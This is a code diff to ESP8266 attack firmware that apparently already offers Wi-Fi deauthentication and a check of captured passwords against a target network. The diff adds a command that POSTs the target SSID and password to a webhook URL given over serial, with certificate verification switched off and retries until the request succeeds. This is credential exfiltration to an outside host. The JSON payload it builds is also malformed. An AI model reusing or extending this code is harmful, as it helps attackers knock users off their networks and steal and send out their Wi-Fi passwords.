@@ -5,6 +5,7 @@
 
 #include <SoftwareSerial.h>
 #include <ESP8266WiFi.h>
+#include <ESP8266HTTPClient.h>
 
 SoftwareSerial esp(D1, D2);
 
@@ -38,6 +39,32 @@ void serialCommand(){
       int duration = readString.substring(seperatorIndex + 1).toInt();
 
       deauth(channel, mac);
+    }
+
+    if(command == "webhook"){
+      String url; String ssid; String pass;
+      while (!esp.available()) { delay(1); }
+      while (esp.available()) {
+        delay(3);
+        char c = esp.read();
+        url += c;
+      }
+
+      while (!esp.available()) { delay(1); }
+      while (esp.available()) {
+        delay(3);
+        char c = esp.read();
+        ssid += c;
+      }
+
+      while (!esp.available()) { delay(1); }
+      while (esp.available()) {
+        delay(3);
+        char c = esp.read();
+        pass += c;
+      }
+
+      sendWebhook(url, ssid, pass);
     }
 
     if(command == "validate"){
@@ -96,6 +123,31 @@ void validate(const String &targetSSID, const String &pass){
       while (WiFi.status() != 3 && WiFi.status() != 4 && millis() - time < 10 * 1000){ delay(250); i++; } //wait until the wifi is conected, the wrong password status is set or the timeout triggered
       esp.printf("wifiStatus|%i", WiFi.status());
       esp.printf("It took %i seconds\n", i/4);
+}
+
+void sendWebhook(const String url, const String ssid, const String pass) {
+  esp.printf("=====WebHook=====\n");
+
+  WiFiClientSecure *client = new WiFiClientSecure; HTTPClient https;
+  int httpCode = 255;
+
+  if (client) {
+    client->setInsecure(); // Disable SSL certificate verification
+    
+    if (https.begin(*client, url)){ // Begin HTTPS requests
+      https.addHeader("Content-Type", "application/json"); // Set request as JSON
+
+      while (httpCode != 200){ // Send POST request
+        httpCode = https.POST("{'ssid':'" + ssid + "','pass':" + pass + "}");
+        esp.printf("Webhook HTTP code %i\n", httpCode);
+        delay(500);
+      }
+      
+      if (httpCode == 200) { https.end(); }
+    }
+  }
+  delete client;
+  esp.printf("=====WebHook=====\n\n");
 }
 
 void setup() {
